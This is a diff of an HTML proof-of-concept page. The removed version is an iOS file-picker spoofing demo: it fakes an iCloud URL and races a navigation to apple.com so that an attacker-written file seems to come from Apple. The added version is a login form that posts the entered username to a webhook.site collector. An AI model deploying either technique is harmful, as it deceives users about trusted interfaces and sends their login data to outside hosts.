@@ -1,50 +1,52 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>iOS File Picker UI Confusion PoC</title>
+  <meta charset="UTF-8">
+  <title>Webhook POC</title>
 </head>
 <body>
 
-<h1 id="trigger">Tap to continue</h1>
+<h2>Login (Webhook POC)</h2>
+
+<input id="username" placeholder="username">
+<button onclick="send()">Login & Kirim</button>
+
+<pre id="result"></pre>
 
 <script>
-const trigger = document.getElementById('trigger');
+const WEBHOOK_URL = "https://webhook.site/22d5ac97-cf01-4c52-8262-9b05e302e583";
 
-trigger.addEventListener('click', async () => {
-  if (!window.showSaveFilePicker) return;
+async function send() {
+  const username = document.getElementById("username").value;
+  if (!username) {
+    alert("Isi username");
+    return;
+  }
 
-  // Step 1: Make URL look trusted
-  history.pushState({}, '', '/icloud/storage');
+  const payload = {
+    user: username,
+    action: "login",
+    time: new Date().toISOString(),
+    from: window.location.href
+  };
 
   try {
-    // Step 2: Native file picker (trusted UI)
-    const handle = await showSaveFilePicker({
-      suggestedName: 'iCloud_Storage_Report.zip',
-      types: [{
-        description: 'ZIP Archive',
-        accept: { 'application/zip': ['.zip'] }
-      }]
+    const res = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
     });
 
-    // Step 3: Navigation race (origin confusion)
-    setTimeout(() => {
-      location.href = 'https://www.apple.com';
-    }, 60);
+    document.getElementById("result").innerText =
+      "✅ Request terkirim ke webhook.site\n\n" +
+      JSON.stringify(payload, null, 2);
 
-    // Step 4: Attacker-controlled content
-    const writable = await handle.createWritable();
-    await writable.write(
-      'PoC ONLY\n' +
-      'This ZIP was created by an attacker-controlled origin\n' +
-      'User believed it came from iCloud / Apple'
-    );
-    await writable.close();
-
-  } catch (e) {
-    // user cancel expected
+  } catch (err) {
+    document.getElementById("result").innerText = "❌ Gagal kirim request";
   }
-}, { once: true });
+}
 </script>
 
 </body>
